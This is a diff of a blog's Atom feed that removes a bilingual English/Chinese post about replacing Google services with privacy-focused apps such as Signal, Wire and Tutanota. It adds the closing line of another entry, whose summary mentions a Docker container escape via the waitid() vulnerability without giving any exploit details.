-&lt;p&gt;While this wasn’t really part of this move, I wanted to recommend some texting, video and voice calling apps that are amazing. I am loving Wire, a chat app that has both desktop and mobile clients. Also, the very popular Signal app.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;雖然這並不真的是這個行動的一部分，我想要推薦一些令人驚奇的文字、影片與語音通話應用程式。我鍾愛 &lt;a href=&quot;http://www.wire.com/&quot;&gt;Wire&lt;/a&gt;，一個聊天應用程式同時有著桌面與移動客戶端。還有很火紅的應用程式 &lt;a href=&quot;https://signal.org/&quot;&gt;Signal&lt;/a&gt;。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;For file sharing, I have installed OnionShare.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我安裝了 OnionShare 來分享檔案。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;strong&gt;Email:&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;電子郵件:&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;This was the last big piece of the puzzle. I have been on Gmail since they launched the first wave of invites. It’s a wonderful web based interface and a good mobile app. Replacing it wasn’t going to be easy. However, I do own my own domain, and figured it was time to use it.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;這是謎題的最後一個巨大的一片拼圖。在 Gmail 發動第一波測試邀請的時候，我就已經在使用了。那是一個美好的基於網頁的介面和一個好的移動裝置應用程式。要想取代它並不簡單。然而，我有擁有自己的域名，該是搞定並使用它的時候了。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;It came down to two providers for me. ProtonMail, makers of ProtonVPN, and Tutanota. Both offer a great service and allow custom domains on their paid accounts. Proton has a much nicer web and mobile interface, but Tutanota has been showing off its beta platform and it’s looking very promising.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;對我來說最後落在兩個供應商，ProtoMail，ProtonVPN 的製造者和 Tutanota。兩者都提供很棒的服務並且允許付費用戶自訂域名。Proton 有更好的網頁及移動裝置介面，但 Tutanota 正炫耀他們的測試平台，而且那看起來非常的有前途。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Here, it really came down to price for me. ProtonMail is $5/mo or $48 a year, while Tutanota is $12 a year.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;到了這個地步，對我來說就剩下價錢之爭了。ProtonMail 是一個月 $5 或一年 $48，Tutanota 則是一年 $12。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Given that Tutanota is open source, and they have a pipeline of amazing products in development, I pulled the trigger and moved my email there.&lt;/p&gt;
-
-&lt;p&gt;考慮到 Tutanota 為開放原始碼，且他們有一個開發中的令人驚嘆的產品管道。我下了決定並將我的電子郵件移到這裡。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;So what’s left?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;還剩下甚麼?&lt;/strong&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Well, first, here is what I am still using from Google:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;啊，首先這裡是我仍然使用中的 Google 產品:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Gmail: While I have switched, I have nearly a decade of stuff on Gmail and accounts that still point here and important pepole how have this email address. I will slowly begin to migrate them away and likely end up at the point where I just forward all my mail away from here.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Gmail: 當我移轉後，我有一個將近十年的東西在 Gmail 與帳戶上仍然指向這裡，並且重要的人有這個電子郵件地址。我將緩慢的開始遷移他們，最後結束在將我所有的郵件都轉送離這裡。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Google Photos: They offer free backup of all my iPhone photos. I have more than 10,000 photos here and don’t have a solid replacement in place yet.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Google Photos: 他們提供免費的備份我所有的 iPhone 照片。我在這裡有多過一萬張照片，並且還沒有一個可靠的替代品。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;YouTube: I mean, I can’t escape this one.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Youtube: 我的意思是，我沒辦法離開這個。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Google+: Yeah,it’s still a thing. I use it to share articles I have written. It also improves search results for my work.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Google+: 對，這東西還存在。我使用它來分享我寫的文章。它同時也對我的工作改善了搜結果。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Google Authenticator: I use 2-Step Authentication for as many sites as will allow and most use this app. The only app based alternative to this is Authy, and if you look in the comments, it’s problematic.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Google Authenticator: 我在很多網站使用兩步驟驗證，且多數都與許這個應用程式。唯一的基於應用程式的替代方案是 Authy，而且如果你看向留言，它還是有問題的。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Google Maps: Anyone have recommendations on good replacement for this?&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Google Maps: 任何人對這個有好的建議替代品嗎?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I also still use Facebook and Twitter which are privacy nightmares of their own.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我也仍在使用隱私夢魘 Facebook 與 Twitter。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;I am also still looking for a good Google Docs replacement. I am testing out Dropbox Paper, and I use LibreOffice on Linux, but I’d like something I can use online more. The hunt continues.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我也還在尋找一個好的 Google Docs 替代品。我正在測試 Dropbox Paper，並且我在 Linux 上使用 LibreOffice，但我想要某些可以線上使用的。狩獵仍持續著。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;What are you using? What recommendations do you have as I continue to improve myh privacy journey?&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;你正在用甚麼? 對我繼續改善隱私之旅你有什麼建議?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Share in the comments.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;在留言分享&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;hr /&gt;</content><author><name>jhe</name></author><category term="privacy" /><summary type="html">Taking privacy seriously leaving google behind</summary></entry></feed>
+&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Docker" /><category term="CVE" /><category term="Linux" /><summary type="html">The post describes how I exploited the waitid() vulnerability in order to modify the Linux capabilities of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.</summary></entry></feed>
